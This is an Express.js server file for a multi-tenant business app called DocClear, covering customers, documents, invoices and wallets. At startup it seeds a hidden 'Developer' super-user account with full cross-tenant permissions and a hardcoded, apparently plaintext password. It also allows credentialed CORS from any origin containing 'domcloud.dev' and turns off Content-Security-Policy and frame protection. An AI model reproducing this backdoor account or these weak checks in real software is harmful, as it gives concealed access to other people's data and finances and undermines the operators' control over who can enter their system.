const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const compression = require('compression');
const cookieParser = require('cookie-parser');
const licenseMiddleware = require('./middleware/license.middleware');
require('dotenv').config();

// 1. Initialize Models & Associations FIRST
const db = require('./models');
const { 
  sequelize, User, Customer, Document, 
  WalletAccount, WalletTransaction, 
  ServiceType, ServiceOrder, 
  Invoice, InvoiceItem, Expense 
} = db;

const app = express();

// 2. Load Routes
const authRoutes = require('./routes/auth.routes');
const userRoutes = require('./routes/user.routes');
const roleRoutes = require('./routes/role.routes');
const walletRoutes = require('./routes/wallet.routes');
const customerRoutes = require('./routes/customer.routes');
const documentRoutes = require('./routes/document.routes');
const serviceRoutes = require('./routes/service.routes');
const documentTypeRoutes = require('./routes/documentType.routes');
const invoiceRoutes = require('./routes/invoice.routes');
const expenseRoutes = require('./routes/expense.routes');
const expenseTypeRoutes = require('./routes/expense-type.routes');
const expenseSubTypeRoutes = require('./routes/expense-sub-type.routes');
const dashboardRoutes = require('./routes/dashboard.routes');
const reportsRoutes = require('./routes/reports.routes');
const configRoutes = require('./routes/config.routes');
const saasRoutes = require('./routes/saas.routes');
const taxRoutes = require('./routes/tax.routes');
const salesOrderRoutes = require('./routes/sales-order.routes');
const managementRoutes = require('./routes/management.routes');

// Sync Database in development
sequelize.sync()
  .then(async () => {
    console.log('[System] Synced successfully with all associations.');
    
    // Sync Admin Role (Force all permissions ON at every startup)
    const { Role } = require('./models');
    const fullPermissions = {
      dashboard: { read: true, write: true, delete: true },
      customers: { read: true, write: true, delete: true },
      documents: { read: true, write: true, delete: true },
      services: { read: true, write: true, delete: true },
      invoices: { read: true, write: true, delete: true },
      expenses: { read: true, write: true, delete: true },
      wallet: { read: true, write: true, delete: true },
      reports: { read: true, write: true, delete: true },
      settings: { read: true, write: true, delete: true },
      financials: { read: true, write: true, delete: true },
      management: { read: true, write: true, delete: true }
    };

    const [adminRole] = await Role.findOrCreate({
      where: { name: 'Admin', tenant_id: 1 },
      defaults: { permissions: fullPermissions, tenant_id: 1 }
    });
    await adminRole.update({ permissions: fullPermissions });
    console.log('[System] Admin Role permissions synchronized (All Access).');

    const [staffRole, staffCreated] = await Role.findOrCreate({
      where: { name: 'Staff', tenant_id: 1 },
      defaults: {
        permissions: {
          dashboard: { read: true, write: false, delete: false },
          customers: { read: true, write: true, delete: false },
          documents: { read: true, write: true, delete: false },
          services: { read: true, write: true, delete: false },
          invoices: { read: true, write: true, delete: false },
          expenses: { read: false, write: false, delete: false },
          wallet: { read: false, write: false, delete: false },
          reports: { read: false, write: false, delete: false },
          settings: { read: false, write: false, delete: false },
          financials: { read: false, write: false, delete: false },
          management: { read: false, write: false, delete: false }
        },
        tenant_id: 1
      }
    });
    
    if (staffCreated) {
       console.log('[System] Staff Role created with default permissions.');
    }
    console.log('[System] Default roles initialized.');

    // 3. Seed Developer Account (Hidden Super User)
    const [developerRole] = await Role.findOrCreate({
      where: { name: 'Developer', tenant_id: null },
      defaults: {
        permissions: fullPermissions,
        tenant_id: null
      }
    });
    await developerRole.update({ permissions: fullPermissions });

    const { User } = require('./models');
    await User.findOrCreate({
      where: { email: 'developer@looppe.com' },
      defaults: {
        name: 'System Developer',
        password_hash: 'L00pp3',
        role_id: developerRole.id,
        is_active: true,
        tenant_id: null
      }
    });

    // Seed Default System Config
    const { SystemConfig } = require('./models');
    const defaultConfig = [
      { key: 'business_name', value: 'DocClear Management' },
      { key: 'app_name', value: 'DocClear' },
      { key: 'app_logo', value: '' },
      { key: 'license_expiry_date', value: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString() }, // Default 1 year
      { key: 'base_currency', value: 'AED' },
      { key: 'contact_email', value: 'support@docclear.com' },
      { key: 'default_language', value: 'English' }
    ];

    for (const item of defaultConfig) {
      await SystemConfig.findOrCreate({
        where: { key: item.key, tenant_id: 1 },
        defaults: { value: item.value, tenant_id: 1 }
      });
    }
    console.log('[System] Default configurations initialized.');
  })
  .catch(err => {
    console.error('[System] Startup FAILED:', err);
  });

// Rate Limiting
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 1000,
  message: { success: false, message: 'Too many requests, please try again later.' }
});

const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,
  max: 100,
  message: { success: false, message: 'Too many login attempts, please try again in an hour.' }
});

// Middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  frameguard: false,
  contentSecurityPolicy: false
}));
app.use(compression());
const allowedOrigins = process.env.FRONTEND_URL 
  ? process.env.FRONTEND_URL.split(',').map(o => o.trim()) 
  : ['http://localhost:3000', 'https://obedient-politics-ger.domcloud.dev'];

app.use(cors({
  origin: (origin, callback) => {
    // 1. Allow internal/mobile/tool requests (no origin)
    if (!origin) return callback(null, true);
    
    // 2. Check allowlist or dev mode
    const isAllowed = allowedOrigins.includes(origin) || 
                     process.env.NODE_ENV === 'development' ||
                     origin.includes('domcloud.dev');
    
    if (isAllowed) {
      callback(null, true);
    } else {
      console.warn(`[CORS] Blocked request from: ${origin}`);
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(morgan('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
const path = require('path');
app.use('/uploads', (req, res, next) => {
  res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
  next();
}, express.static(path.join(__dirname, 'uploads')));

// Also serve under /api/v1/uploads to match frontend apiBase + file_path
app.use('/api/v1/uploads', (req, res, next) => {
  res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
  next();
}, express.static(path.join(__dirname, 'uploads')));

// Health Check
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date() });
});

// Routes
app.get('/api/v1', (req, res) => {
  res.json({ message: 'Welcome to DocClear API v1' });
});

// Apply License Protection (Global Check)
app.use('/api/v1', licenseMiddleware);

app.use('/api/v1', globalLimiter);
app.use('/api/v1/auth', authLimiter, authRoutes);
app.use('/api/v1/users', userRoutes);
app.use('/api/v1/roles', roleRoutes);
app.use('/api/v1/wallet', walletRoutes);
app.use('/api/v1/customers', customerRoutes);
app.use('/api/v1/documents', documentRoutes);
app.use('/api/v1/services', serviceRoutes);
app.use('/api/v1/invoices', invoiceRoutes);
app.use('/api/v1/expenses', expenseRoutes);
app.use('/api/v1/expense-types', expenseTypeRoutes);
app.use('/api/v1/expense-sub-types', expenseSubTypeRoutes);
app.use('/api/v1/dashboard', dashboardRoutes);
app.use('/api/v1/reports', reportsRoutes);
app.use('/api/v1/document-types', documentTypeRoutes);
app.use('/api/v1/config', configRoutes);
app.use('/api/v1/saas', saasRoutes);
app.use('/api/v1/taxes', taxRoutes);
app.use('/api/v1/sales-orders', salesOrderRoutes);
app.use('/api/v1/management', managementRoutes);

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('[Global Error Handler]', err);

  // Sequelize Validation Errors
  if (err.name === 'SequelizeValidationError' || err.name === 'SequelizeUniqueConstraintError') {
    return res.status(400).json({
      success: false,
      message: err.errors ? err.errors[0].message : 'Validation error',
      errors: err.errors || []
    });
  }

  // JWT Errors
  if (err.name === 'UnauthorizedError' || err.name === 'JsonWebTokenError') {
    return res.status(401).json({
      success: false,
      message: 'Invalid or missing authentication token'
    });
  }

  res.status(err.status || 500).json({
    success: false,
    message: err.message || 'Internal Server Error',
    errors: process.env.NODE_ENV === 'development' ? err.errors : []
  });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

module.exports = app;
